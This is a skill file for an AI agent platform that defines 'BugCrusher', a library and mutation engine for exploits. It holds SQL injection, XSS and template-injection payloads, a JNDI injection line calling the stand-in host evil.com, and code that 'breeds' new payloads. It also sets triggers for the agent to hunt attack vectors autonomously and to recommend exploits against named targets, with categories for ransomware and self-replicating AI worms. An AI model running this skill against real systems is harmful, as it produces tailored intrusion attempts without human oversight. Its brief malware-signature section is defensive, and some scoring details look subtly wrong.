---
name: vector-strike
description: BugCrusher's vector knowledge base — stores, learns from, and multiplies every working exploit, payload, and attack technique. Builds attack mutation chains and autonomously discovers new exploitation vectors from existing successful patterns.
compatibility: Created for Zo Computer
metadata:
  author: morningstar.zo.computer
---

# VECTOR STRIKE — Mutation Engine & Vector Library

BugCrusher doesn't just store exploits. It LEARNS from them, MUTATES them, and BREEDS new attack vectors autonomously.

---

## CORE CONCEPT

Every successful exploit/prompt/payload becomes a **Vector Seed**.

```
VECTOR SEED → MUTATION ENGINE → DERIVED VECTORS → SELECTIVE BREEDING → PRODUCTION VECTORS
```

---

## VECTOR DATABASE

### Schema

```json
{
  "vector_id": "uuid",
  "name": "SQL Injection — Auth Bypass",
  "type": "sql_injection",
  "category": "web",
  "payload": "' OR '1'='1",
  "target": "mysql",
  "context": "authentication bypass",
  "cvss": 9.8,
  "confidence": 95,
  "works": true,
  "mutations": ["uuid1", "uuid2"],
  "derived_from": null,
  "hunt_count": 0,
  "success_count": 0,
  "failure_count": 0,
  "success_rate": 0.0,
  "tags": ["auth-bypass", "sql", "classic"],
  "created_at": "timestamp",
  "last_used": "timestamp",
  "metadata": {}
}
```

### Categories

| Category | Types |
|----------|-------|
| **web** | sql_injection, xss, ssti, xxe, ssrf, lfi, rfi, idor, auth_bypass, csrf, race_condition |
| **network** | smb_relay, ntlm_relay, mitm, arp_spoofing, dns_poisoning, vlan_hopping |
| **malware** | ransomware, trojan, backdoor, rootkit, keylogger, cryptominer, botnet, dropper |
| **ai_worm** | prompt_injection, context_poisoning, tool_abuse, lateral_spread, self_replication |
| **mobile** | apk_reversing, ssl_pinning_bypass, root_detection, runtime_manipulation |
| **cloud** | s3_misconfig, iam_privilege_escalation, ssrf_cloud_metadata, container_escape |
| **ad** | kerberoasting, golden_ticket, silver_ticket, pass_the_hash, DCSync |
| **crypto** | weak_rng, oracle_attack, key_reuse, padding_oracle |

---

## MUTATION ENGINE

### Mutation Types

**1. Character Mutation**
```
Original: ' OR '1'='1
Mutated: ' OR '2'='2
         ' OR 'a'='a
         ' OR 1=1--
         ' OR 'x'='x
```

**2. Encoding Mutation**
```
Original: <script>alert(1)</script>
Mutated: <script>alert(1)</script> (URL encoded)
         %3Cscript%3Ealert(1)%3C/script%3E
         <script>alert&#40;1&#41;</script> (HTML entities)
         <ScRiPt>alert(1)</ScRiPt> (mixed case)
```

**3. Contextual Mutation**
```
Original: ${7*7}
Mutated: {{7*7}} (Handlebars)
         {{7*'7'}} (Jinja2)
         <%= 7*7 %> (ERB)
         ${jndi:ldap://evil.com/a} (JNDI injection)
```

**4. Polyglot Mutations**
```
Original: javascript:alert(1)
Mutated: java\nscript:alert(1) (newline obfuscation)
         JAvascript:alert(1) (mixed case)
         &#106;avascript:alert(1) (unicode编码)
```

**5. Protocol Mutation**
```
Original: http://target.com/api?q=1
Mutated: http://target.com/api?q=1%00.
         https://target.com/api?q=1
         http://target.com:8080/api?q=1
         http://target.com/api//?q=1
```

---

## SELF-MUTATING MALWARE DETECTION

Beyond AI worms. BugCrusher hunts ALL self-mutating threats:

### Malware Families Tracked

| Family | Indicator | Mutation Pattern |
|--------|-----------|-------------------|
| **Polymorphic Malware** | Code structure changes but payload same | Encryptor + Decryptor wrapper |
| **Metamorphic Malware** | Rewrites own code on replication | Instruction substitution, register remapping |
| **AI-Enhanced Malware** | Uses LLM to generate variants | Prompt-injected mutation requests |
| **Worm (Network)** | Self-propagates via exploits | Email, SMB, USB, web server exploits |
| **Fileless Malware** | Lives only in memory | No file drop, process injection |
| **Rootkit** | Hides from detection | DKOM, SSDT hooks, UAC bypass |
| **Ransomware** | Encrypts and demands payment | Affiliate networks, RaaS |
| **Botnet** | Remote control, DDoS | Fast-flux DNS, P2P command control |

### Mutation Detection Signatures

```
PATTERN: Recursive base64 encoding > 3 layers
THREAT: Possible metamorphic loader
SEVERITY: HIGH

PATTERN: PowerShell command with reversed strings
THREAT: Fileless malware execution
SEVERITY: CRITICAL

PATTERN: Scheduled task creating new scheduled task
THREAT: Persistence + lateral movement
SEVERITY: HIGH

PATTERN: Unexpected DNS queries to non-standard ports
THREAT: C2 beacon or data exfiltration
SEVERITY: CRITICAL
```

---

## LEARNING ALGORITHM

### Vector Success Scoring

```python
def vector_score(vector):
    # Weighted scoring based on real-world effectiveness
    base_score = vector.success_count / max(vector.hunt_count, 1)
    cvss_weight = vector.cvss / 10.0
    confidence_weight = vector.confidence / 100.0
    recency_weight = vector.last_used.days_ago / 30
    
    return (base_score * 0.4) + (cvss_weight * 0.3) + (confidence_weight * 0.2) + (recency_weight * 0.1)
```

### Breeding New Vectors

```python
def breed_vectors(parent_a, parent_b):
    # Cross-over: combine payload components
    child_payload = crossover(parent_a.payload, parent_b.payload)
    
    # Mutation: apply random transformations
    mutated_payload = mutate(child_payload, rate=0.3)
    
    # Context inheritance
    child_context = parent_a.context if parent_a.cvss > parent_b.cvss else parent_b.context
    
    return Vector(
        payload=mutated_payload,
        context=child_context,
        derived_from=f"{parent_a.id}|{parent_b.id}"
    )
```

---

## USAGE

Triggered when:
- User asks to store a successful exploit/payload/prompt
- Request to find existing vectors for a vulnerability type
- Need to mutate a known exploit for a specific target
- Hunting for new attack vectors autonomously
- Malware analysis and signature generation

### Commands

```bash
# Store a new vector
bugcrusher --store --payload "' OR '1'='1" --type sql_injection --target mysql --cvss 9.8

# Find vectors for attack type
bugcrusher --search --type xss --min-cvss 7.0

# Generate mutated variants
bugcrusher --mutate --vector-id <uuid> --count 10

# Get top vectors for target
bugcrusher --recommend --target "target.com" --limit 10
```
